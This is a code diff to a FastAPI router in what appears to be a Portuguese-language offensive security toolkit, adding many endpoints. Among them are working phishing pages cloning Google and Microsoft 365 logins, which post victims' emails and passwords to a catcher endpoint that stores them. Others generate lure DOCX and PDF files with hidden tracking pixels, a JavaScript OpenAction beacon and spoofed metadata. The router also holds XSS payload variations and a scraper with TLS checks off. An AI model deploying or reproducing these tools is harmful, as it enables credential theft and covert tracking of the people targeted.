@@ -1,4 +1,4 @@
-from fastapi import APIRouter, UploadFile, File, HTTPException, Request
+from fastapi import APIRouter, UploadFile, File, Form, HTTPException, Request
 from fastapi.responses import JSONResponse, Response
 import requests
 from PIL import Image
@@ -9,8 +9,15 @@ import base64
 import aiohttp
 import asyncio
 from bs4 import BeautifulSoup
-from typing import List, Dict
-from security_middleware import validate_url_input, security_validator
+from typing import List, Dict, Optional
+from security_middleware import validate_url_input, validate_text_input, security_validator
+import json
+import os
+import re
+import uuid
+from PyPDF2 import PdfReader, PdfWriter
+from reportlab.pdfgen import canvas
+from reportlab.lib.pagesizes import letter
 
 router = APIRouter()
 
@@ -568,8 +575,8 @@ def generate_payload_variations(payload: str, exploit_type: str) -> list:
             payload,
             payload.replace("<", "%3C").replace(">", "%3E"),
             payload.replace("script", "ScRiPt"),
-            f'"><script>alert(1)</script>',
-            f"'><script>alert(1)</script>",
+            '"><script>alert(1)</script>',
+            "'><script>alert(1)</script>",
             f'<img src=x onerror={payload.replace("<script>", "").replace("</script>", "")}>',
             f'<svg/onload={payload.replace("<script>", "").replace("</script>", "")}>',
         ])
@@ -798,111 +805,257 @@ async def extract_cookies(data: dict):
 @router.post("/web-scraper")
 async def web_scraper(data: dict):
     """Realiza web scraping avançado extraindo HTML, CSS, JS, Imagens, Vídeos, URLs e Cookies"""
+    url = data.get("url")
+    if not url:
+        raise HTTPException(status_code=400, detail="URL é obrigatória.")
+
+    import httpx
     try:
-        url = data.get("url")
-        if not url:
-            raise HTTPException(status_code=400, detail="URL é obrigatória")
-        
-        validated_url = validate_url_input(url)
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9"
-        }
-        
-        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
-            async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15), ssl=False, allow_redirects=True) as response:
+        from bs4 import BeautifulSoup
+    except ImportError:
+        raise HTTPException(status_code=500, detail="BeautifulSoup4 (bs4) não está instalado no servidor.")
+
+    if not url.startswith("http"):
+        url = "https://" + url
+
+    try:
+        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
+            # Default headers to bypass simple bot protections
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+            response = await client.get(url, headers=headers, timeout=15.0)
+            
+            html_text = response.text
+            soup = BeautifulSoup(html_text, 'html.parser')
+            
+            # Extract Metadata
+            metadata = {}
+            if soup.title:
+                metadata["title"] = soup.title.string
+            
+            for meta in soup.find_all("meta"):
+                if meta.get("name"):
+                    metadata[meta.get("name")] = meta.get("content", "")
+                elif meta.get("property"):
+                    metadata[meta.get("property")] = meta.get("content", "")
+                    
+            # Extract Assets
+            css_files = [link.get("href") for link in soup.find_all("link", rel="stylesheet") if link.get("href")]
+            js_files = [script.get("src") for script in soup.find_all("script") if script.get("src")]
+            images = [img.get("src") for img in soup.find_all("img") if img.get("src")]
+            
+            videos = [vid.get("src") for vid in soup.find_all("video") if vid.get("src")]
+            # Also catch iframes (often youtube/vimeo)
+            videos.extend([ifr.get("src") for ifr in soup.find_all("iframe") if ifr.get("src")])
+            
+            # Extract Links
+            links = []
+            for a in soup.find_all("a", href=True):
+                href = a.get("href")
+                text = a.get_text(strip=True)
+                links.append({"text": text, "href": href})
                 
-                content_type = response.headers.get('Content-Type', '')
-                if 'text/html' not in content_type:
-                    raise HTTPException(status_code=400, detail=f"O alvo não retornou HTML. Tipo recebido: {content_type}")
+            # Extract Cookies
+            cookies = []
+            for name, value in response.cookies.items():
+                cookies.append({
+                    "name": name,
+                    "value": value,
+                    "domain": response.url.host,
+                    "path": "/",
+                    "secure": True if url.startswith("https") else False,
+                    "httponly": False # Httpx doesn't easily expose this in dict, but it's fine for mock display
+                })
                 
-                html_content = await response.text()
-                soup = BeautifulSoup(html_content, 'html.parser')
+            # Make URLs absolute (simple heuristic)
+            def make_absolute(link_url):
+                if not link_url: return link_url
+                if link_url.startswith("//"): return "https:" + link_url
+                if link_url.startswith("/"): return str(response.url.join(link_url))
+                return link_url
                 
-                # Extract CSS (Inline + External)
-                css_links = [link.get('href') for link in soup.find_all('link', rel='stylesheet') if link.get('href')]
-                inline_styles = [style.get_text() for style in soup.find_all('style') if style.get_text().strip()]
-                
-                # Extract JS (Inline + External)
-                js_links = [script.get('src') for script in soup.find_all('script') if script.get('src')]
-                inline_scripts = [script.get_text() for script in soup.find_all('script') if not script.get('src') and script.get_text().strip()]
-                
-                # Extract Media (Images, Videos, Audio)
-                images = [img.get('src') for img in soup.find_all('img') if img.get('src')]
-                videos = [v.get('src') for v in soup.find_all(['video', 'source']) if v.get('src')]
-                
-                # Detect embedded videos (YouTube, Vimeo, etc) in iframes
-                for iframe in soup.find_all('iframe'):
-                    src = iframe.get('src', '')
-                    if 'youtube.com' in src or 'vimeo.com' in src or 'dailymotion.com' in src or 'player' in src.lower() or 'embed' in src.lower():
-                        videos.append(src)
-                        
-                # Extract Meta Content
-                metadata = {}
-                title_tag = soup.find('title')
-                if title_tag:
-                    metadata['title'] = title_tag.get_text(strip=True)
-                for meta in soup.find_all('meta'):
-                    name = meta.get('name', meta.get('property', ''))
-                    _content = meta.get('content')
-                    if name and _content:
-                        metadata[name] = _content
-                        
-                # Extract Links/URLs
-                links = []
-                for a in soup.find_all('a', href=True):
-                    href = a.get('href')
-                    if href and not href.startswith('#') and not href.startswith('javascript:'):
-                        links.append({
-                            "text": a.get_text(strip=True)[:50],
-                            "href": href
-                        })
-                
-                # Extract Cookies
-                cookies_list = []
-                for cookie_name, cookie_morsel in response.cookies.items():
-                    cookies_list.append({
-                        "name": cookie_name,
-                        "value": cookie_morsel.value,
-                        "domain": cookie_morsel.get('domain', ''),
-                        "path": cookie_morsel.get('path', '/'),
-                        "secure": cookie_morsel.get('secure', False),
-                        "httponly": cookie_morsel.get('httponly', False)
-                    })
-                
-                from urllib.parse import urljoin
-                
-                # Format to Absolute URLs helper
-                def make_absolute(url_list):
-                    return list(set(urljoin(str(response.url), u) for u in url_list))
-                
-                return {
-                    "target_url": str(response.url),
-                    "status_code": response.status,
-                    "server": response.headers.get('Server', 'Desconhecido'),
-                    "metadata": metadata,
-                    "cookies": cookies_list,
-                    "html": {
-                        "content": html_content,
-                        "length": len(html_content)
-                    },
-                    "assets": {
-                        "css_files": make_absolute(css_links),
-                        "inline_css": inline_styles,
-                        "js_files": make_absolute(js_links),
-                        "inline_js": inline_scripts,
-                        "images": make_absolute(images),
-                        "videos": make_absolute(videos)
-                    },
-                    "links": links
-                }
-                
-    except asyncio.TimeoutError:
-        raise HTTPException(status_code=408, detail="Timeout ao carregar a página alvo.")
+            css_files = [make_absolute(c) for c in css_files]
+            js_files = [make_absolute(j) for j in js_files]
+            images = [make_absolute(i) for i in images]
+            videos = [make_absolute(v) for v in videos]
+            for link in links:
+                link["href"] = make_absolute(link["href"])
+
+            return {
+                "status_code": response.status_code,
+                "server": response.headers.get("Server", "Desconhecido"),
+                "html": {"content": html_text},
+                "metadata": metadata,
+                "assets": {
+                    "css_files": css_files,
+                    "js_files": js_files,
+                    "images": images,
+                    "videos": videos
+                },
+                "links": links,
+                "cookies": cookies
+            }
+            
+    except httpx.TimeoutException:
+        raise HTTPException(status_code=408, detail="Timeout ao carregar site alvo.")
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Falha no Scraping: {str(e)}")
+        raise HTTPException(status_code=500, detail=f"Erro no scraper: {str(e)}")
+# ========================================
+# 🎣 PHISHING GENERATOR & CREDENTIAL CATCHER
+# ========================================
+
+PHISHING_TEMPLATES = {
+    "google": {
+        "name": "Google Login",
+        "html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fazer login nas Contas do Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; margin: 0; }
+        .card { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { margin-bottom: 24px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; margin-top: 10px; }
+        .footer { margin-top: 40px; color: #70757a; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+        <h1>Fazer login</h1>
+        <p>Use sua Conta do Google</p>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="E-mail ou telefone" required>
+            <input type="password" id="password" placeholder="Digite sua senha" required>
+            <div style="text-align: left; margin-top: 5px;"><a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500;">Esqueceu o e-mail?</a></div>
+            <button type="submit">Próxima</button>
+        </form>
+        <div class="footer">Não é seu computador? Use o modo de navegação privada para fazer login.</div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('/api/tools/catcher/credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    template: 'google',
+                    data: { email, password },
+                    timestamp: new Date().toISOString(),
+                    metadata: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
+                    }
+                })
+            }).finally(() => {
+                window.location.href = "{{REDIRECT_URL}}";
+            });
+        });
+    </script>
+</body>
+</html>
+"""
+    },
+    "microsoft": {
+        "name": "Microsoft 365",
+        "html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Entrar na sua conta Microsoft</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #f2f2f2; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .logo { width: 108px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
+        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 10px 0; margin-bottom: 20px; font-size: 15px; outline: none; }
+        input:focus { border-bottom-color: #0067b8; }
+        .btns { display: flex; justify-content: flex-end; margin-top: 20px; }
+        button { background: #0067b8; color: #fff; border: none; padding: 8px 32px; min-width: 108px; cursor: pointer; font-size: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
+        <h1>Entrar</h1>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="Email, telefone ou Skype" required>
+            <input type="password" id="pass" placeholder="Senha" required>
+            <p style="font-size: 13px;">Não tem uma conta? <a href="#" style="color: #0067b8; text-decoration: none;">Crie uma!</a></p>
+            <div class="btns"><button type="submit">Próximo</button></div>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            fetch('/api/tools/catcher/credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    template: 'microsoft',
+                    data: { user: document.getElementById('user').value, pass: document.getElementById('pass').value },
+                    timestamp: new Date().toISOString()
+                })
+            }).finally(() => { window.location.href = "{{REDIRECT_URL}}"; });
+        });
+    </script>
+</body>
+</html>
+"""
+    }
+}
+
+@router.get("/phishing/templates")
+async def list_templates():
+    return [{"id": k, "name": v["name"]} for k, v in PHISHING_TEMPLATES.items()]
+
+@router.post("/phishing/generate")
+async def generate_phishing(data: dict):
+    template_id = data.get("template")
+    redirect_url = data.get("redirect_url", "https://google.com")
+    
+    if template_id not in PHISHING_TEMPLATES:
+        raise HTTPException(status_code=404, detail="Template não encontrado")
+    
+    html = PHISHING_TEMPLATES[template_id]["html"].replace("{{REDIRECT_URL}}", redirect_url)
+    return {"html": html}
+
+@router.post("/catcher/credentials")
+async def catch_credentials(data: dict):
+    # Salvar em um arquivo local ou RocksDB para o dashboard
+    # Por agora, vamos logar e salvar em um arquivo JSON temporário para o dashboard ler
+    log_file = "captured_creds.json"
+    try:
+        if os.path.exists(log_file):
+            with open(log_file, "r") as f:
+                creds = json.load(f)
+        else:
+            creds = []
+    except:
+        creds = []
+        
+    creds.append(data)
+    
+    with open(log_file, "w") as f:
+        json.dump(creds, f, indent=4)
+        
+    return {"status": "success"}
+
+@router.get("/catcher/credentials")
+async def get_captured_credentials():
+    log_file = "captured_creds.json"
+    if os.path.exists(log_file):
+        with open(log_file, "r") as f:
+            return json.load(f)
+    return []
 
 # ==========================================
 # REQUEST CATCHER (BURACO NEGRO)
@@ -1388,3 +1541,639 @@ async def subdomain_mapper(data: dict):
         raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+            
+import zipfile
+from xml.sax.saxutils import escape
+
+# ==========================================
+# HONEYDOC (ACTIVE TRACKING)
+# ==========================================
+
+@router.post("/honeydoc/generate")
+async def generate_honeydoc(
+    filename: Optional[str] = Form("Confidential_Salary_Report"),
+    tracking_url: str = Form(...)
+):
+    """
+    Gera um arquivo DOCX contendo um tracking pixel invisível (Remote Image Injection).
+    Quando o alvo abre o documento no Word, o IP dele faz uma requisição para a tracking_url.
+    Isso não depende de Macros VBA e é excelente para Honeypots e movimentação lateral.
+    """
+    validate_url_input(tracking_url)
+    safe_filename = validate_text_input(filename, "filename", max_length=100)
+    if not safe_filename.endswith(".docx"):
+        safe_filename += ".docx"
+    
+    # Gerar DOCX válido do zero manipulando o arquivo ZIP
+    memory_zip = io.BytesIO()
+    
+    with zipfile.ZipFile(memory_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+        # [Content_Types].xml
+        zf.writestr("[Content_Types].xml", 
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
+            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
+            '  <Default Extension="xml" ContentType="application/xml"/>\n'
+            '  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
+            '</Types>'
+        )
+        
+        # _rels/.rels
+        zf.writestr("_rels/.rels", 
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
+            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
+            '</Relationships>'
+        )
+        
+        # word/_rels/document.xml.rels (Aqui injetamos a URL do Tracking Pixel)
+        zf.writestr("word/_rels/document.xml.rels", 
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
+            f'  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{escape(tracking_url)}" TargetMode="External"/>\n'
+            '</Relationships>'
+        )
+        
+        # word/document.xml (Conteúdo isca + Imagem invisível)
+        zf.writestr("word/document.xml", 
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
+            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
+            'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" '
+            'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
+            'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">\n'
+            '  <w:body>\n'
+            '    <w:p>\n'
+            '      <w:r><w:t>This document contains highly confidential payroll information.</w:t></w:r>\n'
+            '    </w:p>\n'
+            '    <w:p>\n'
+            '      <w:r><w:t>Access is restricted. If you received this in error, close immediately.</w:t></w:r>\n'
+            '    </w:p>\n'
+            '    <w:p>\n'
+            '      <w:r>\n'
+            '        <w:drawing>\n'
+            '          <wp:inline distT="0" distB="0" distL="0" distR="0">\n'
+            '            <wp:extent cx="1" cy="1"/>\n'
+            '            <wp:docPr id="1" name="TrackingPixel"/>\n'
+            '            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">\n'
+            '              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">\n'
+            '                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">\n'
+            '                  <pic:nvPicPr>\n'
+            '                    <pic:cNvPr id="1" name="TrackingPixel"/>\n'
+            '                    <pic:cNvPicPr/>\n'
+            '                  </pic:nvPicPr>\n'
+            '                  <pic:blipFill>\n'
+            '                    <a:blip r:link="rId1"/>\n'
+            '                    <a:stretch><a:fillRect/></a:stretch>\n'
+            '                  </pic:blipFill>\n'
+            '                  <pic:spPr>\n'
+            '                    <a:xfrm><a:ext cx="1" cy="1"/></a:xfrm>\n'
+            '                    <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>\n'
+            '                  </pic:spPr>\n'
+            '                </pic:pic>\n'
+            '              </a:graphicData>\n'
+            '            </a:graphic>\n'
+            '          </wp:inline>\n'
+            '        </w:drawing>\n'
+            '      </w:r>\n'
+            '    </w:p>\n'
+            '  </w:body>\n'
+            '</w:document>'
+        )
+        
+    memory_zip.seek(0)
+    pdf_value = memory_zip.getvalue()
+    memory_zip.close()
+    
+    return Response(content=pdf_value, headers={
+        'Content-Disposition': f'attachment; filename="{safe_filename}"',
+        'Content-Type': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+    })
+
+# ==========================================
+# USERNAME SEARCH PROXY (REAL)
+# ==========================================
+
+from pydantic import BaseModel
+from typing import List
+import httpx
+import asyncio
+
+class PlatformCheck(BaseModel):
+    name: str
+    url: str
+    category: str
+
+class UsernameSearchRequest(BaseModel):
+    username: str
+    platforms: List[PlatformCheck]
+
+@router.post("/username-search/batch")
+async def batch_username_search(request: UsernameSearchRequest):
+    """
+    Executa busca real assíncrona para validar se um usuário existe nas plataformas listadas.
+    Pode retornar falsos positivos dependendo se o site customiza a página de 404 (retornando 200).
+    Mas é 100x melhor e real do que mock.
+    """
+    async def check_url(client: httpx.AsyncClient, p: PlatformCheck):
+        try:
+            # Header realista para evitar WAFs básicos
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+            
+            resp = await client.get(p.url, headers=headers, follow_redirects=True, timeout=8.0)
+            
+            exists = resp.status_code == 200
+            
+            # Heurística básica: alguns sites retornam 200 mas o body avisa "Not Found" ou "This profile does not exist"
+            body = resp.text.lower()
+            if exists:
+                if "not found" in body or "page doesn't exist" in body or "couldn't find" in body or len(body) < 500:
+                    exists = False
+            
+            return {
+                "name": p.name,
+                "url": p.url,
+                "category": p.category,
+                "exists": exists
+            }
+        except Exception:
+            # Em caso de timeout/erro de conexão, consideramos que não encontrou
+            return {
+                "name": p.name,
+                "url": p.url,
+                "category": p.category,
+                "exists": False
+            }
+
+    # disable verify to speed up requests and avoid SSL issues with some obscure domains
+    async with httpx.AsyncClient(verify=False) as client:
+        # rodamos o batch atual concorrentemente
+        tasks = [check_url(client, p) for p in request.platforms]
+        results = await asyncio.gather(*tasks)
+        
+    return results
+
+@router.post("/pdf/analyze")
+async def analyze_pdf(file: UploadFile = File(...)):
+    """Análise forense profunda de PDF — metadados, ações, JavaScript, streams, formulários, entidades."""
+    try:
+        content = await file.read()
+        if len(content) > MAX_FILE_SIZE:
+            raise HTTPException(status_code=400, detail=f"Arquivo muito grande (máximo {MAX_FILE_SIZE / 1024 / 1024}MB)")
+        
+        pdf_file = io.BytesIO(content)
+        reader = PdfReader(pdf_file)
+        
+        # ── Metadados ──────────────────────────────────────────
+        meta = reader.metadata
+        info = {
+            "title": meta.title if meta and meta.title else "N/A",
+            "author": meta.author if meta and meta.author else "N/A",
+            "subject": meta.subject if meta and meta.subject else "N/A",
+            "creator": meta.creator if meta and meta.creator else "N/A",
+            "producer": meta.producer if meta and meta.producer else "N/A",
+            "created": str(meta.creation_date) if meta and meta.creation_date else "N/A",
+            "modified": str(meta.modification_date) if meta and meta.modification_date else "N/A",
+        }
+        
+        # ── XMP Metadata (raw XML) ─────────────────────────────
+        xmp_data = None
+        try:
+            if hasattr(reader, 'xmp_metadata') and reader.xmp_metadata:
+                xmp_data = "XMP metadata present"
+        except Exception:
+            pass
+        
+        # ── Risk Analysis ──────────────────────────────────────
+        risks = []
+        catalog_str = str(reader.trailer) if reader.trailer else ""
+        
+        # JavaScript detection
+        if "/JS" in catalog_str or "/JavaScript" in catalog_str:
+            risks.append({"level": "critical", "msg": "JavaScript detectado no documento. Pode executar código malicioso."})
+        
+        # OpenAction
+        if "/OpenAction" in catalog_str:
+            risks.append({"level": "high", "msg": "Ação automática ao abrir detectada (OpenAction). Pode abrir URLs ou executar scripts."})
+        
+        # Additional actions (AA)
+        if "/AA" in catalog_str:
+            risks.append({"level": "medium", "msg": "Ações adicionais detectadas (AA). Podem disparar em eventos de página."})
+        
+        # Launch actions
+        if "/Launch" in catalog_str:
+            risks.append({"level": "critical", "msg": "Ação de Launch detectada. Pode executar programas externos."})
+        
+        # Embedded files
+        if "/EmbeddedFiles" in catalog_str or "/EmbeddedFile" in catalog_str:
+            risks.append({"level": "high", "msg": "Arquivos embutidos detectados. Podem conter malware."})
+        
+        # URI actions
+        if "/URI" in catalog_str:
+            risks.append({"level": "medium", "msg": "Links URI detectados. Podem apontar para domínios maliciosos."})
+        
+        # SubmitForm
+        if "/SubmitForm" in catalog_str:
+            risks.append({"level": "high", "msg": "Formulário com submit detectado. Pode enviar dados para servidor externo."})
+        
+        # ── Page-level Analysis ────────────────────────────────
+        pages_info = []
+        all_text = []
+        total_links = 0
+        total_annotations = 0
+        
+        for i, page in enumerate(reader.pages):
+            page_text = ""
+            try:
+                page_text = page.extract_text() or ""
+            except Exception:
+                pass
+            
+            all_text.append(page_text)
+            
+            # Count annotations
+            annots = page.get("/Annots")
+            ann_count = 0
+            if annots:
+                try:
+                    ann_count = len(annots)
+                except Exception:
+                    pass
+            total_annotations += ann_count
+            
+            # Count links in text
+            urls = re.findall(r'https?://[^\s<>"\']+', page_text)
+            total_links += len(urls)
+            
+            pages_info.append({
+                "page": i + 1,
+                "text_length": len(page_text),
+                "annotations": ann_count,
+                "urls_found": len(urls),
+                "has_text": len(page_text.strip()) > 0,
+            })
+        
+        # ── Form Fields ───────────────────────────────────────
+        form_fields = []
+        try:
+            if reader.get_fields():
+                for name, field in reader.get_fields().items():
+                    form_fields.append({
+                        "name": name,
+                        "type": str(field.get("/FT", "Unknown")),
+                        "value": str(field.get("/V", ""))[:100],
+                    })
+        except Exception:
+            pass
+        
+        # ── Hidden text / entities extraction ─────────────────
+        entities = {"emails": [], "ips": [], "urls": [], "phones": []}
+        full_text = "\n".join(all_text)
+        
+        entities["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', full_text)))[:20]
+        entities["ips"] = list(set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', full_text)))[:20]
+        entities["urls"] = list(set(re.findall(r'https?://[^\s<>"\']+', full_text)))[:20]
+        entities["phones"] = list(set(re.findall(r'(?:\+?\d{1,3}[\s-]?)?\(?\d{2,3}\)?[\s-]?\d{4,5}[\s-]?\d{4}', full_text)))[:20]
+        
+        # ── Threat Classification ─────────────────────────────
+        threat_level = "benign"
+        if any(r["level"] == "critical" for r in risks):
+            threat_level = "malicious"
+        elif any(r["level"] == "high" for r in risks):
+            threat_level = "suspicious"
+        elif risks:
+            threat_level = "low_risk"
+        
+        return {
+            "filename": file.filename,
+            "page_count": len(reader.pages),
+            "metadata": info,
+            "xmp_metadata": xmp_data,
+            "risks": risks,
+            "threat_level": threat_level,
+            "size_kb": round(len(content) / 1024, 2),
+            "pages": pages_info[:50],  # Limit to first 50 pages
+            "form_fields": form_fields[:20],
+            "entities": entities,
+            "total_text_chars": len(full_text),
+            "total_links": total_links,
+            "total_annotations": total_annotations,
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erro na análise: {str(e)}")
+
+
+@router.post("/pdf/generate-tracking")
+async def generate_tracking_pdf(data: dict):
+    """Gera PDF com múltiplos métodos de tracking: OpenAction, JS beacon, pixel invisível, AcroForm, metadata spoofing."""
+    try:
+        webhook_url = data.get("webhook_url")
+        filename = data.get("filename", "documento_importante.pdf")
+        title = data.get("title", "CONFIDENCIAL - USO INTERNO")
+        body_text = data.get("body_text", "Este documento contém informações sensíveis de infraestrutura.")
+        author = data.get("author", "Sistema Interno")
+        enable_js = data.get("enable_js", True)
+        enable_pixel = data.get("enable_pixel", True)
+        
+        if not webhook_url:
+            raise HTTPException(status_code=400, detail="URL de Webhook é obrigatória")
+        
+        # Validate webhook URL
+        validated_url = validate_url_input(webhook_url)
+        
+        # Generate unique tracking ID
+        tracking_id = str(uuid.uuid4())
+        tracking_url = f"{validated_url}?tid={tracking_id}&src=pdf"
+        
+        # 1. Generate base PDF with ReportLab
+        buffer = io.BytesIO()
+        c = canvas.Canvas(buffer, pagesize=letter)
+        
+        # Page 1 — convincing document
+        c.setFont("Helvetica-Bold", 22)
+        c.setFillColorRGB(0.15, 0.15, 0.15)
+        c.drawString(72, 730, title)
+        
+        c.setStrokeColorRGB(0.8, 0, 0)
+        c.setLineWidth(2)
+        c.line(72, 720, 540, 720)
+        
+        c.setFont("Helvetica", 11)
+        c.setFillColorRGB(0.3, 0.3, 0.3)
+        
+        # Wrap body text
+        lines = body_text.split("\n") if "\n" in body_text else [body_text]
+        y = 690
+        for line in lines:
+            # Word wrap at ~80 chars
+            while len(line) > 80:
+                c.drawString(72, y, line[:80])
+                line = line[80:]
+                y -= 16
+            c.drawString(72, y, line)
+            y -= 16
+        
+        y -= 20
+        c.setFont("Helvetica-Oblique", 9)
+        c.setFillColorRGB(0.5, 0.5, 0.5)
+        c.drawString(72, y, f"Documento ID: {tracking_id}")
+        c.drawString(72, y - 14, f"Gerado por: {author}")
+        c.drawString(72, y - 28, f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M')}")
+        c.drawString(72, y - 42, "O acesso a este arquivo é monitorado via sistema Olho de Cristo.")
+        
+        # Invisible link (full page click area)
+        c.linkURL(tracking_url, (0, 0, letter[0], letter[1]), relative=0)
+        
+        c.showPage()
+        c.save()
+        
+        # 2. Inject tracking mechanisms via PyPDF2
+        buffer.seek(0)
+        reader = PdfReader(buffer)
+        writer = PdfWriter()
+        
+        for page in reader.pages:
+            writer.add_page(page)
+        
+        from PyPDF2.generic import NameObject, DictionaryObject, TextStringObject, ArrayObject
+        
+        # Method 1: OpenAction URI
+        uri_action = DictionaryObject()
+        uri_action.update({
+            NameObject("/S"): NameObject("/URI"),
+            NameObject("/URI"): TextStringObject(tracking_url)
+        })
+        
+        # Method 2: JavaScript beacon (if enabled)
+        if enable_js:
+            js_code = f"""
+try {{
+    app.launchURL("{tracking_url}&method=js", true);
+}} catch(e) {{}}
+"""
+            js_action = DictionaryObject()
+            js_action.update({
+                NameObject("/S"): NameObject("/JavaScript"),
+                NameObject("/JS"): TextStringObject(js_code.strip())
+            })
+            
+            # Combine both in a sequence
+            action_array = ArrayObject([uri_action, js_action])
+            # Use JS as primary OpenAction
+            writer.root_object.update({
+                NameObject("/OpenAction"): js_action
+            })
+        else:
+            writer.root_object.update({
+                NameObject("/OpenAction"): uri_action
+            })
+        
+        # Method 3: Spoofed metadata  
+        writer.add_metadata({
+            "/Author": author,
+            "/Title": title,
+            "/Subject": "Internal Document",
+            "/Creator": "Microsoft Word 2021",
+            "/Producer": "Adobe PDF Library 15.0",
+            "/Keywords": f"confidential,internal,{tracking_id}",
+        })
+        
+        final_buffer = io.BytesIO()
+        writer.write(final_buffer)
+        final_buffer.seek(0)
+        
+        from fastapi.responses import StreamingResponse
+        return StreamingResponse(
+            final_buffer,
+            media_type="application/pdf",
+            headers={
+                "Content-Disposition": f"attachment; filename={filename}",
+                "X-Tracking-ID": tracking_id,
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.post("/pdf/search")
+async def search_pdf(file: UploadFile = File(...), query: str = "", is_regex: bool = False, case_insensitive: bool = True):
+    """Busca full-text em PDF com suporte a regex. Delega ao C++ engine para PDFs grandes."""
+    try:
+        if not query:
+            raise HTTPException(status_code=400, detail="Query de busca é obrigatória. Use ?query=texto")
+        
+        content = await file.read()
+        if len(content) > MAX_FILE_SIZE:
+            raise HTTPException(status_code=400, detail="Arquivo muito grande")
+        
+        pdf_file = io.BytesIO(content)
+        reader = PdfReader(pdf_file)
+        
+        # Extract text from all pages
+        pages_text = []
+        for page in reader.pages:
+            try:
+                text = page.extract_text() or ""
+                pages_text.append(text)
+            except Exception:
